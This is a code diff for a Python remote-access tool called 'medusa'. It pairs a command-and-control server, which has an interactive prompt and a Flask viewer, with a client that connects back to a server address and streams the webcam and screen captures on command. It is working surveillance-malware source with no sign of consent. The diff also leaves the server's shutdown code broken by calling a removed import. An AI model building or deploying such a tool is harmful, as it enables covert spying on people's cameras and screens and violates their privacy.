@@ -1,19 +1,18 @@
 import socket
 import threading
 import time
-from flask import Flask, Response, render_template_string, request
+from flask import Flask, Response, render_template_string
 from colorama import Fore, Style, init
 import cv2
 import numpy as np
 import signal
-import os
+import sys
 
 init(autoreset=True)
 
 app = Flask(__name__)
 server_thread = None
 stop_server_flag = threading.Event()
-client_connected = False
 
 html_template = """
 <!DOCTYPE html>
@@ -29,8 +28,6 @@ html_template = """
 """
 
 def start_streaming(client_socket, mode):
-    global client_connected
-    client_connected = True
     print(Fore.BLUE + "[ * ] Starting...")
     time.sleep(1)
     print(Fore.BLUE + "[ * ] Preparing player...")
@@ -56,53 +53,34 @@ def start_streaming(client_socket, mode):
     print(Fore.BLUE + "[ * ] Streaming...")
 
 def generate_frames(client_socket):
-    global client_connected
-    while client_connected:
-        try:
-            data = client_socket.recv(921600)
-            if not data:
-                client_connected = False
-                break
-            frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
-            ret, buffer = cv2.imencode('.jpg', frame)
-            frame = buffer.tobytes()
-            yield (b'--frame\r\n'
-                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-        except Exception as e:
-            client_connected = False
-            print(Fore.RED + "[ ERROR ] unable to reach the client")
+    while True:
+        data = client_socket.recv(921600)
+        if not data:
             break
+        frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
+        ret, buffer = cv2.imencode('.jpg', frame)
+        frame = buffer.tobytes()
+        yield (b'--frame\r\n'
+               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 
 def handle_client(client_socket):
-    global server_thread, client_connected
     while True:
-        try:
-            command = input(Fore.MAGENTA + "medusa > ")
-            if command == "CTRL+D":
-                stop_server()
-                print(Fore.RED + "[ * ] Server stopped.")
-                continue
-            client_socket.send(command.encode('utf-8'))
-            if command.startswith("webcam_stream") or command.startswith("screen_stream"):
-                mode = command.split('_')[0]
-                start_streaming(client_socket, mode)
-            elif command.startswith("exec "):
-                pass  # Execute command on client
-        except EOFError:
+        command = input(Fore.MAGENTA + "medusa > ")
+        if command == "CTRL+P":
             stop_server()
             print(Fore.RED + "[ * ] Server stopped.")
-            break
-        except Exception as e:
-            if not client_connected:
-                print(Fore.RED + "[ ERROR ] unable to reach the client")
-            break
+            continue
+        client_socket.send(command.encode('utf-8'))
+        if command.startswith("webcam_stream") or command.startswith("screen_stream"):
+            mode = command.split('_')[0]
+            start_streaming(client_socket, mode)
 
 def stop_server():
-    global server_thread
-    if server_thread and server_thread.is_alive():
-        stop_server_flag.set()
-        os.kill(os.getpid(), signal.SIGINT)
-        server_thread.join()
+    stop_server_flag.set()
+    func = request.environ.get('werkzeug.server.shutdown')
+    if func is None:
+        raise RuntimeError('Not running with the Werkzeug Server')
+    func()
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -115,6 +93,44 @@ def main():
         print(Fore.GREEN + f"[ * ] Connection established from {addr}")
         client_handler = threading.Thread(target=handle_client, args=(client_socket,))
         client_handler.start()
+
+if __name__ == "__main__":
+    main()
+
+#client
+
+import socket
+import cv2
+import pyautogui
+import numpy as np
+
+def webcam_stream(client_socket):
+    cap = cv2.VideoCapture(0)
+    while True:
+        ret, frame = cap.read()
+        if not ret:
+            break
+        _, buffer = cv2.imencode('.jpg', frame)
+        client_socket.sendall(buffer.tobytes())
+
+def screen_stream(client_socket):
+    while True:
+        screen = pyautogui.screenshot()
+        frame = np.array(screen)
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        _, buffer = cv2.imencode('.jpg', frame)
+        client_socket.sendall(buffer.tobytes())
+
+def main():
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect(('server_ip', 9999))
+
+    while True:
+        command = client_socket.recv(1024).decode('utf-8')
+        if command == "webcam_stream":
+            webcam_stream(client_socket)
+        elif command == "screen_stream":
+            screen_stream(client_socket)
 
 if __name__ == "__main__":
     main()
